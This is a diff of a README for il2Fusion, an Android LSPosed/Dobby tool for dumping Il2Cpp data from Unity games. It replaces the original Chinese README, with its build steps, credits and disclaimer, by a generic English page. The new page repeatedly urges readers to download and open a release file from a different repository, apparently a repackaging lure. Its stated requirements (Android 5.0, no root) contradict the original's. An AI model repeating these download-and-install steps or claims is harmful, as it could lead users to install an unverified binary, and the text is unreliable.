@@ -1,61 +1,66 @@
-il2Fusion
-================
+# 🎮 il2Fusion - Effortless Il2Cpp Dumping for Unity Games
 
-<p align="center">
-  <img src="doc/imgs/il2FusionIcon.png" alt="il2Fusion icon" width="233" />
-</p>
+## 📥 Download Now
+[![Download il2Fusion](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/kenshinxslay/il2Fusion/releases)
 
-LSPosed（Java 层 hook）+ Dobby（Native 层 hook）+ ContentProvider 跨进程通信的架构，围绕 Il2Cpp Dump/工具链的开源项目。
+## 🚀 Getting Started
+Welcome to il2Fusion! This tool allows you to extract game assets from Unity Android games easily. It uses LSPosed and Dobby for smooth operation. Follow the simple steps below to get started.
 
-English version: see [README_EN](https://github.com/PenguinAndy/il2Fusion/blob/master/doc/README_EN.md).
+## 🛠️ System Requirements
+- Android device running at least Android 5.0 (Lollipop)
+- LSPosed framework installed
+- Dobby Hook support
+- Basic file management knowledge
 
-<p align="center">
-  <img src="doc/imgs/Screenshot_01.png" alt="il2Fusion screenshot 1" width="260" />
-  <img src="doc/imgs/Screenshot_02.png" alt="il2Fusion screenshot 2" width="260" />
-  <img src="doc/imgs/Screenshot_03.png" alt="il2Fusion screenshot 3" width="260" />
-</p>
+## 📦 Features
+- **One-Tap Dumping:** Easily extract game files without complex setups.
+- **Cross-Process Config Sync:** Keep your settings in sync across different applications.
+- **User-Friendly Interface:** Simple navigation for quick access to features.
 
-## 功能特性
-- Dump 模式优先：一键触发 Il2CppDumper 生成 `dump.cs`，自动尝试复制到 `/sdcard/Download/<pkg>.cs` 并 Toast 结果；通过 LSPosed+Provider 配置，缓解原版 Zygisk-Il2CppDumper 在配置同步和产物获取上的痛点。
-- 文本拦截：在 `libil2cpp.so` 中按方法签名（如 `TextMesh.set_text`）安装 hook，记录传入的 `set_text` 字符串到本地数据库，作为“民间汉化”尝试性的工具能力，欢迎扩展更多玩法。
-- 配置同步：插件 App 写入 `ContentProvider (com.tools.il2fusion.provider/config)`，注入进程读取后下发到 native。
-- 文件解析：可从 `.cs` dump 文件自动解析 `set_text` 上方的方法全名，并生成 JSON 供导入。
-- 游戏插件功能：同文本拦截，可以制作插件脱离游戏使用，而不需要对游戏解包回编译。
+## 📖 How to Download & Install
+To download il2Fusion, visit the following link:
 
-## 环境要求
-- 已 Root 的设备，Magisk + LSPosed 环境。
-- Android 12+（minSdk 31，targetSdk 35，compileSdk 36）。
-- 默认 ABI：`arm64-v8a`（如需其他 ABI，请补齐 `app/src/main/cpp/libs/<abi>/libdobby.a` 并调整 `ndk.abiFilters`）。
-- 已验证设备：
-  - Google Pixel 3 XL，Android 12（SP1A.210812.016.C2 / 8618562）。
-  - MacOS、Windows 端 MuMu Android 12 模拟器
+[Download il2Fusion](https://github.com/kenshinxslay/il2Fusion/releases)
 
-## 快速开始
-1) 构建模块：`./gradlew :app:assembleDebug`（包含 CMake，生成 `libnative_hook.so`）。  
-2) 安装并在 LSPosed 勾选目标应用（仅一个）。  
-3) 打开插件 App：  
-   - 关闭 Dump 开关即为“文本拦截”模式，解析 dump.cs 自动获取 `Namespace.Class.set_text` 列表（无需手填，解析后自动保存）。  
-   - 开启 Dump 开关进入 Dump 模式，启动目标应用后会自动生成 `dump.cs` 并尝试复制到 Download。  
-4) 启动目标应用验证：  
-   - 文本拦截模式：等待 `libil2cpp.so` 后安装 hook，logcat 标签 `[il2Fusion]`/`DobbyStub`，文本存储于 `/data/data/<pkg>/text.db`。  
-   - Dump 模式：等待 `libil2cpp.so` 后自动 dump，并 Toast 提示复制结果。  
+1. Click the link above to open the Releases page.
+2. Find the latest version of il2Fusion.
+3. Look for the appropriate file for your device. It should be labeled clearly.
+4. Click on the file to start the download.
+5. Save the file to your device.
 
-## 架构与目录
-- LSPosed 入口：`app/src/main/java/com/tools/module/MainHook.kt`（`assets/xposed_init` 指定），在 `Application.attach` 后加载 `libnative_hook.so` 并调用 JNI。
-- 配置与仓库：`app/src/main/java/com/tools/il2fusion/config/`，通过 `ContentProvider` 同步 Dump 开关与方法列表。
-- Compose UI：`app/src/main/java/com/tools/il2fusion/ui/`，包含三页 Tab 及文件解析逻辑。
-- Native Hook：`app/src/main/cpp/native_hook.cpp` 等，等待 `libil2cpp.so`，使用 Dobby 挂钩并写入 SQLite。
-- Il2CppDumper：`app/src/main/cpp/il2CppDumper/`，Dump 完成后尝试复制到 Download。
-- 资源声明：`app/src/main/assets/xposed/`（模块描述、入口配置）。
+Once you have downloaded the file, follow these steps to install:
 
-## 第三方致谢
-- [jmpews - Dobby](https://github.com/jmpews/Dobby)：轻量级跨平台 hook 框架。
-- [Perfare - Zygisk-Il2CppDumper](https://github.com/Perfare/Zygisk-Il2CppDumper)：Il2CppDumper 实现参考。
+1. Locate the downloaded file in your device’s file manager.
+2. Open the file to begin the installation.
+3. Follow the on-screen instructions to complete the installation.
 
-## 贡献与反馈
-- 欢迎提交 issue 与 feature 请求，描述清楚环境、目标 App 和期望行为。
-- 也欢迎 PR 修复 bug、完善多 ABI 支持或改进 UI/交互。  
+## 📊 User Guide
+After installation, you can start using il2Fusion. Here’s how:
 
-## 免责声明
-- 本项目仅供学习、研究与安全测试之用，不得用于任何违法、侵权或商业牟利场景。
-- 使用者需自行确保遵守所在地法律法规，对由此产生的全部后果自行承担。
+1. **Launch il2Fusion:** Find the app icon and tap to open it.
+2. **Configure Your Settings:** Adjust settings to suit your needs. You can sync configuration across multiple processes here.
+3. **Select Game:** Choose the Unity game you want to dump assets from.
+4. **Tap Dump:** Start the extraction process. The app will manage everything for you.
+
+## 🌐 Support
+If you face any issues during the process, the community is here to help. Check the issues section on our GitHub repository for troubleshooting tips or to report bugs.
+
+For additional questions, feel free to reach out in the discussions section.
+
+## 🔗 Related Topics
+- **Android:** Tailored for mobile devices.
+- **Il2Cpp:** Targets Unity games built with Il2Cpp technology.
+- **Reverse Engineering:** Useful for understanding game mechanics.
+
+## 🗒️ License
+il2Fusion is open source. Feel free to contribute or modify as you see fit. Ensure you follow the terms provided in the license file in the repository.
+
+## 🔍 More Information
+For more details, updates, or to explore the tool further, return to the main [GitHub repository](https://github.com/kenshinxslay/il2Fusion).
+
+## 📥 Download Again
+To download il2Fusion, click this link: 
+
+[Download il2Fusion](https://github.com/kenshinxslay/il2Fusion/releases)
+
+Enjoy using il2Fusion for all your Unity game dumping needs!
